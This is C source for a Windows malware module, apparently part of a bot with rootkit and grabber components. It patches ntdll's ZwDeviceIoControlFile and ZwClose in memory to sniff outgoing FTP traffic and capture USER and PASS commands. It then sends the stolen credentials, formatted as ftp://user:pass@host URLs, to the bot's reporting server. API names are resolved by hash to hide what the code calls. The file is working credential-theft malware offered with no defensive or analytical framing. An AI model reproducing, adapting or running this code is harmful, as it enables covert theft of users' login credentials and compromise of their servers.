#include <winsock2.h>
#include <windows.h>

#include "GetApi.h"
#include "Config.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Rootkit.h"
#include "Grabber.h"
#include "Loader.h"
#include "Unhook.h"
#include "ntdll.h"

typedef struct _FTPDATA
{
	SOCKET Socket;
	char *Servername;
	char *Username;
	char *Password;
	int  Port;
	struct _FTPDATA *next;
} *PFTPDATA;

PFTPDATA FtpHead; 

PFTPDATA CreateData()
{
	PFTPDATA pData = (PFTPDATA)MemAlloc( sizeof( PFTPDATA ) );
	
	if ( pData == NULL )
	{
		return NULL;
	} 

	m_memset( pData, 0, sizeof( PFTPDATA ) );
	
	if ( FtpHead == NULL )
	{
		FtpHead = (PFTPDATA)MemAlloc( sizeof( PFTPDATA ) );
		FtpHead->next = pData;
		pData->next  = NULL;
		return pData;
	} 

	PFTPDATA tmp = NULL;

	for ( tmp = FtpHead; tmp->next != NULL; tmp = tmp->next );

	if ( tmp->next == NULL )
	{
		tmp->next = pData;
		pData->next = NULL;

		return pData;
	}

	return NULL;
}

PFTPDATA FindSocket( SOCKET Socket )
{
	if ( FtpHead == NULL || Socket <= 0 )
	{
		return NULL;
	}

	for ( PFTPDATA tmp = FtpHead->next; tmp != NULL; tmp = tmp->next )
	{
		if ( tmp->Socket == Socket )
		{
			return tmp;
		}
	}	

	return NULL;
}

void DeleteData( SOCKET Socket )
{
	if ( FtpHead == NULL && Socket <= 0 )
	{
		return;
	}

	PFTPDATA Prev = NULL;
	PFTPDATA tmp  = NULL;

	for ( tmp = FtpHead->next; tmp != NULL; Prev = tmp, tmp = tmp->next )
	{
		if ( tmp->Socket == Socket )
		{
			MemFree( tmp->Servername );
			MemFree( tmp->Username   );
			MemFree( tmp->Password   );

			if ( Prev == NULL )
			{
				FtpHead->next = tmp->next;
			}
			else
			{
				Prev->next = tmp->next;
			}

			tmp = NULL;
		}
	}


	return;
}
//----------------------------------------------------------------------------

typedef struct
{
	char *Buffer;
	DWORD dwSize;
} FTPSNIFFER, *PFTPSNIFFER;


DWORD WINAPI ReportSnifferLogs(LPVOID Data)
{
    // отправить отчёт о перехваченных данных FTP авторизации
	if (Data == NULL)
		return 0;
	PFTPSNIFFER D = (PFTPSNIFFER)Data;

	PCHAR URL = GetBotScriptURL(SCRIPT_FTP_SNIFFER);

	if (URL == NULL)
		return 0;

	bool Result = SendGrabberReport( URL, D->Buffer, D->dwSize );

    STR::Free(URL);
	return Result;
}
//----------------------------------------------------------------------------

typedef NTSTATUS ( WINAPI *PZwDeviceIoControlFile )( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
													 PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode,
													 PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer,
													 ULONG OutputBufferLength );


PZwDeviceIoControlFile ZwDeviceIoControlFileReal;

typedef struct _AFD_WSABUF {
	 UINT  len;
	 PCHAR buf;
} AFD_WSABUF, *PAFD_WSABUF;


typedef struct  _AFD_SEND_INFO {
	PAFD_WSABUF			BufferArray;
	ULONG				BufferCount;
	ULONG				AfdFlags;
	ULONG				TdiFlags;
} AFD_SEND_INFO , *PAFD_SEND_INFO ;

#define AFD_SEND         7
#define METHOD_NEITHER   3

#define FSCTL_AFD_BASE   18
#define _AFD_CONTROL_CODE(Operation,Method) ((FSCTL_AFD_BASE)<<12 | (Operation<<2) | Method)
#define IOCTL_AFD_SEND _AFD_CONTROL_CODE(AFD_SEND, METHOD_NEITHER)


void InputBufferParsing( PFTPDATA pData, char *buf )
{
	DWORD dwStart = 0;
	DWORD dwEnd   = 0;

	if ( pData->Username == NULL )
	{
		char szUser[] = {'U','S','E','R',' ',0};
		
		dwStart = m_istrstr( buf, szUser );

		if ( dwStart != -1 )
		{
			dwStart += m_lstrlen( szUser );
			dwEnd = m_istrstr( buf + dwStart, "\r\n" );

			if ( dwEnd != -1 && dwEnd < 64 )
			{
				DWORD dwLen = ( dwEnd - ( dwStart - m_lstrlen( szUser ) ) + 1 );

				if ( ( pData->Username = (char*)MemAlloc( dwLen ) ) != NULL )
				{
					m_memcpy( pData->Username, buf + dwStart, dwLen - 1 );
					return;
				}
			}
		}
	}

	if ( pData->Username != NULL && pData->Password == NULL )
	{
		char szPass[] = {'P','A','S','S',' ',0};
		dwStart = m_istrstr( buf, szPass );

		if ( dwStart != -1 )
		{
			dwStart += m_lstrlen( szPass );
			dwEnd = m_istrstr( buf + dwStart, "\r\n" );

			if ( dwEnd != -1 && dwEnd < 64 )
			{
				DWORD dwLen = ( dwEnd - ( dwStart - m_lstrlen( szPass ) ) + 1 );
					
				if ( ( pData->Password = (char*)MemAlloc( dwLen ) ) != NULL )
				{
					m_memcpy( pData->Password, buf + dwStart, dwLen - 1 );

					if ( m_lstrlen( pData->Password ) && m_lstrlen( pData->Username ) && m_lstrlen( pData->Servername ) )
					{
						char *Buffer = (char*)MemAlloc( 1024 );

						if ( Buffer != NULL )
						{
							typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
							fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

							_pwsprintfA( Buffer, "ftp://%s:%s@%s:%d", pData->Username, pData->Password, pData->Servername, pData->Port );
							
							PFTPSNIFFER pFtp = (PFTPSNIFFER)MemAlloc( sizeof( PFTPSNIFFER ) );

							if ( pFtp != NULL )
							{
								pFtp->Buffer = Buffer;
								pFtp->dwSize = m_lstrlen( Buffer );

								StartThread( ReportSnifferLogs, pFtp );
							}
						}
					}
				}
			}
		}
	}

	return;
}


void SocketParsing( SOCKET Socket, PVOID InputBuffer )
{
	PFTPDATA pData = FindSocket( Socket );

	if ( pData == NULL )
	{
		struct sockaddr Name;
		int NameLen = sizeof( struct sockaddr );

		if ( !(int)pgetpeername( Socket, &Name, &NameLen ) )
		{
			sockaddr_in *SockAddr = (sockaddr_in*)&Name;

			if ( SockAddr->sin_addr.S_un.S_addr != 0x100007F )
			{
				int Port = (int)phtons( SockAddr->sin_port );

				if ( Port == 21 )
				{
					LPHOSTENT lpHost = (LPHOSTENT)pgethostbyaddr( (const char *)&SockAddr->sin_addr, 4, 2 );

					if ( lpHost != NULL )
					{
						if ( ( pData = CreateData() ) == NULL )
						{
							return;
						}

						pData->Socket = Socket;

						if ( ( pData->Servername = (char*)MemAlloc( m_lstrlen( lpHost->h_name ) + 1 ) ) == NULL )
						{
							return;
						}
						
						m_memcpy( pData->Servername, lpHost->h_name, m_lstrlen( lpHost->h_name ) );
						pData->Servername[ m_lstrlen( pData->Servername ) ] = '\0';

						pData->Port = Port;
					}
				}
			}
		}
	}

	if ( pData != NULL )
	{
		PAFD_SEND_INFO pBuf = (PAFD_SEND_INFO)InputBuffer;

		for ( DWORD i = 0; i < pBuf->BufferCount; i++ )
		{
			if ( pBuf->BufferArray[i].len > 1 )
			{
				InputBufferParsing( pData, pBuf->BufferArray[i].buf );
			}
		}		
	}

	return;
}


NTSTATUS WINAPI ZwDeviceIoControlFileHook( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
										   PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode,
										   PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer,
										   ULONG OutputBufferLength )
{
	if ( InputBufferLength > 0 && IoControlCode == IOCTL_AFD_SEND ) //send handler
	{
		SOCKET Socket = (SOCKET)FileHandle;
		SocketParsing( Socket, InputBuffer );
	}
	
	return ZwDeviceIoControlFileReal( FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength );
}

DWORD dwAddrDcfProc; //ZwDeviceIoControlFile

__declspec( naked ) void JmpToHookDcfProc()
{
	__asm
	{
		pop eax
		lea eax,ZwDeviceIoControlFileHook
		jmp eax
		retn
	}
}


void HookZwDeviceIoControlFile()
{
	dwAddrDcfProc = (DWORD)&JmpToHookDcfProc;
	DWORD dwAddr  = (DWORD)&dwAddrDcfProc;

	PZwDeviceIoControlFile ZwDeviceIoControlFile = (PZwDeviceIoControlFile)GetProcAddressEx( NULL, 5, 0x385D3092 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwDeviceIoControlFile;

	if ( lpPtr == NULL )
	{
		return;
	}

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwDeviceIoControlFileReal =  (PZwDeviceIoControlFile)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwDeviceIoControlFileHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );
		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwDeviceIoControlFile, PAGE_EXECUTE_READ );

	return;
}

typedef NTSTATUS ( WINAPI *PZwClose )( HANDLE  Handle );

PZwClose ZwCloseReal;

NTSTATUS WINAPI ZwCloseHook( HANDLE Handle )
{
	SOCKET Socket = (SOCKET)Handle;

	if ( FtpHead != NULL && Socket > 0 )
	{
		PFTPDATA Prev = NULL;
		PFTPDATA tmp  = NULL;

		for ( tmp = FtpHead->next; tmp != NULL; Prev = tmp, tmp = tmp->next )
		{
			if ( tmp->Socket == Socket )
			{
				MemFree( tmp->Servername );
				MemFree( tmp->Username   );
				MemFree( tmp->Password   );

				if ( Prev == NULL )
				{
					FtpHead->next = tmp->next;
				}
				else
				{
					Prev->next = tmp->next;
				}

				tmp = NULL;
			}
		}
	}

	return ZwCloseReal( Handle );
}

DWORD dwAddrClsProc; //ZwClose

__declspec( naked ) void JmpToHookClsProc()
{
	__asm
	{
		pop eax
		lea eax,ZwCloseHook
		jmp eax
		retn
	}
}


void HookZwClose()
{
	dwAddrClsProc = (DWORD)&JmpToHookClsProc;
	DWORD dwAddr  = (DWORD)&dwAddrClsProc;

	PZwClose ZwClose = (PZwClose)GetProcAddressEx( NULL, 5, 0x3D9A9259 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwClose;

	if (lpPtr == NULL)
	{
		return;
	}

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwCloseReal =  (PZwClose)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwCloseHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1);

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );
		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwClose, PAGE_EXECUTE_READ );

	return;
}

void FtpSniffer()
{
	FtpHead = NULL;
	HookZwDeviceIoControlFile();
	HookZwClose();

	return;
}